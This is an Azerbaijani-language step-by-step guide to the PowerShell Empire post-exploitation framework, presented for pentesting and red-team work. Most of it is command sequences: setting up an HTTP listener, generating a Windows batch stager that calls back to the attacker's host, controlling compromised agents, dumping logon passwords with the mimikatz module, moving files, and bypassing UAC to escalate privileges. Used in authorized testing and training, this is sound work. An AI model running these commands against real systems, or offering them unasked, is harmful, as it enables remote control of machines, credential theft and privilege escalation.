# Powershell Empire

## 📌 1. PowerShell Empire nədir?

**PowerShell Empire** penetration testing (pentest) və red team əməliyyatları üçün istifadə olunan post-exploitation framework-dür.

Əsas məqsədi:
- Sistemə daxil olduqdan sonra nəzarəti saxlamaq
- Komandaları uzaqdan icra etmək
- Məlumat toplamaq
- Privilege escalation etmək

---

## ⚙️ 2. Qurulum (Kali Linux üçün)

```bash
sudo apt update
sudo apt install powershell-empire
```

Əgər problem çıxarsa:
```bash
sudo apt --fix-broken install
```

---

## 🚀 3. Empire başlatmaq

```bash
sudo powershell-empire server
```

Yeni terminalda:
```bash
sudo powershell-empire client
```

---

## 🧠 4. Əsas anlayışlar

### 🔹 Listener
- Hədəf sistem agentinin qoşulacağı server

### 🔹 Agent
- Hədəf maşında işləyən payload

### 🔹 Module
- Müxtəlif hücum və ya məlumat toplama scriptləri

---

## 📡 5. Listener yaratmaq

```bash
listeners
uselistener http
set Name mylistener
set Host http://YOUR_IP
set Port 8080
execute
```

---

## 💣 6. Payload yaratmaq

```bash
usestager windows/launcher_bat
set Listener mylistener
execute
```

---

## 🎯 7. Agent qoşulduqdan sonra

```bash
agents
interact AGENT_NAME
```

---

## 🧪 8. Əsas komandalar

```bash
sysinfo
whoami
shell ipconfig
```

---

## 📦 9. Modul istifadə etmək

```bash
usemodule situational_awareness/network/arpscan
set Agent AGENT_NAME
execute
```

---

## 🔐 10. Credential dumping

```bash
usemodule credentials/mimikatz/logonpasswords
set Agent AGENT_NAME
execute
```

---

## 📂 11. Fayl əməliyyatları

```bash
upload local.txt C:\Users\Public\file.txt
download C:\Users\Public\file.txt
```

---

## 🔼 12. Privilege Escalation

```bash
usemodule privesc/bypassuac
set Agent AGENT_NAME
execute
```

---

## 🧹 13. Agent silmək

```bash
kill AGENT_NAME
```

---
